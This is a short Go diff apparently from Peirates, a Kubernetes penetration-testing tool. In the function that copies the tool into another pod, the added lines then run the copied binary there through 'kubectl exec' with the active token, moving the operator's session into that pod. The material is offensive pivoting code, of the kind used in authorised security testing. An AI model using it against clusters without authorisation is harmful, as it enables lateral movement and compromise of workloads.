@@ -47,6 +47,12 @@ func injectIntoAPodViaAPIServer(connectionString ServerInfo, pod string) {
 	} else {
 		println(string(copyIntoPod))
 		println("[+] Transfer successful")
+		if connectionString.ActiveTokenKind != "" {
+			if err := runKubectlWithConfig(connectionString, os.Stdin, os.Stdout, os.Stderr, "exec", "-it", pod, "--", "/tmp/peirates"); err != nil {
+				fmt.Printf("[-] Executing Peirates in pod %q failed: %v\n", pod, err)
+			}
+			return
+		}
 
 		// println("Do you wish to [1] move entirely into that pod OR [2] be given a copy-pastable command so you can keep this peirates instance?")
 		// Feature request: give the user the option to exec into the next pod.
